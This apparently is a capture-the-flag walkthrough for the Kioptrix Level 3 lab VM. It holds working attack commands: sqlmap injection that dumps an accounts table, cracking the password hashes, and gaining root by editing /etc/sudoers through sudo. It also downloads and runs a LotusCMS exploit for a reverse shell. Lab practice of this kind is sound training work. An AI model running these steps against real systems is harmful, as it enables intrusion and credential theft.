# Kioptrix Level 3
Insert `ethernet0.connectionType = "nat"` to .vmx, and change all `bridged` in the .vmx file of the VM before use VMware to open it.
![](https://i.imgur.com/NWG2WuI.png)
Host is `192.168.232.145`
![](https://i.imgur.com/58HjyQ9.png)
Victim is `192.168.232.148`
`nmap -sS -sV -A -p- -oN NmapKioptrixLv3.txt 192.168.232.148`
![](https://i.imgur.com/aK0CjHC.png)
We first start recon web service, `httponly flag not set` may cookie lost, maybe there's XSS exploit here.
![](https://i.imgur.com/q3cGznc.png)

![](https://i.imgur.com/7gUqYcY.png)

![](https://i.imgur.com/eGD0pWW.png)
Here can simply use [LotusCMS-Exploit](https://github.com/Hood3dRob1n/LotusCMS-Exploit) / [Lotus CMS Fraise 3.0 - Local File Inclusion / Remote Code Execution](https://www.exploit-db.com/exploits/15964) to get the shell in apache privilege, but not PoE there. 
We first `dirb` the directories of this website.
![](https://i.imgur.com/yUCc9Dd.png)
We will see there's database and gallery on this website.
![](https://i.imgur.com/3DekYkl.png)
I find that some herf cannot correct find the domain `http://kioptrix3.com/`, so I edit `/etc/hosts` to map VM IP to `kioptrix3.com`
`192.168.232.148   kioptrix3.com `
Then we can get website work properly.
![](https://i.imgur.com/7Dc0ujg.png)
Enter `Ligoat press room` you will find a sort dropdown.
![](https://i.imgur.com/s5oB7Tn.png)
Then you might find that URL change.
![](https://i.imgur.com/G6lWPnL.png)
Now we can use LotusRCE shell to find the Account/Password in the DataBase or just use sqlmap to get them remotely.
`sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos" --dbms=MySQL`
![](https://i.imgur.com/u3F19bs.png)

`sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos" --dbms=MySQL --dbs`
![](https://i.imgur.com/6bOKIQC.png)

`sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos" --dbms=MySQL -D gallery --tables`
![](https://i.imgur.com/uDJrhcn.png)

`sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos" --dbms=MySQL -D gallery -T dev_accounts --dump`
![](https://i.imgur.com/ksXNKjI.png)

Crack the hash. I use onlne `md5hashing.net`
![](https://i.imgur.com/WdCxHnL.png)
![](https://i.imgur.com/KtHzEzp.png)

Then try to SSH these account with these AC/PW.
![](https://i.imgur.com/JVCIbRZ.png)
`dreg` is empty and restricted.
![](https://i.imgur.com/s6Vu7r0.png)
There are something under `loneferret` folder. The policy said we can only use `ht` in `root`.
![](https://i.imgur.com/ExuZjet.png)
`sudo -l` tell us that we can not use `su` but `ht`
![](https://i.imgur.com/OoHpTbL.png)
However, `ht` is a file editor, we can use it to edit the `/etc/sudoers` to get `root` bash shell.
![](https://i.imgur.com/wkSC6At.png)
Fail with default environment variable TERM value `xterm-256color`, kioptrix3 is a red hat Linux, execute `export TERM=xterm` before the `sudo ht` command.
References:
* https://stackoverflow.com/questions/6804208/nano-error-error-opening-terminal-xterm-256color
* http://www.cloudfarm.it/fix-error-opening-terminal-xterm-256color-unknown-terminal-type/

![](https://i.imgur.com/sct7beX.png)
`sudo ht -t /etc/sudoers`
Or follow the [Document](http://hte.sourceforge.net/readme.html), use `F3` to open the `/etc/sudoers`, add `/bin/bash`
![](https://i.imgur.com/pmW7NVC.png)
`F2` save it, `F10` quit it.
![](https://i.imgur.com/WKvjL9N.png)
Then you might become `root`, enter to `/root` and find the `Congrats.txt`.
![](https://i.imgur.com/TbTWu4X.png)
Remember to reset the `/etc/hosts` if you need it.

## Use RCE to get the AC/PW in database
```bash
nc -lvp 8888
```
```bash
wget https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/master/lotusRCE.sh
chmod +x lotusRCE.sh
./lotusRCE 192.168.232.148
```
Setting reverse shell target and listener port/type
![](https://i.imgur.com/WmwIQJE.png)
`python -c "import pty; pty.spawn('/bin/bash')"`
![](https://i.imgur.com/lVEVQeg.png)
We already known that gallery connect to a sql db, let find some AC/PW the website used to login.
`cd gallery`
![](https://i.imgur.com/vrWKwqH.png)
`gprofile.php` & `gconfig.php` are suspicious, take a look, if not, maybe we should trace code to find the website connect section.
![](https://i.imgur.com/rRHmiqT.png)
Nope.
![](https://i.imgur.com/VLcvMtC.png)
Ok, Here we got. Let's enter to the DB.
`mysql -h localhost -u root -p`
![](https://i.imgur.com/L0l9SUa.png)
`show databases;`
![](https://i.imgur.com/38Fe2nM.png)
```
use gallery;
show tables;
```
![](https://i.imgur.com/fx3Iess.png)
`select * from dev_accounts;`
![](https://i.imgur.com/pixMBFO.png)
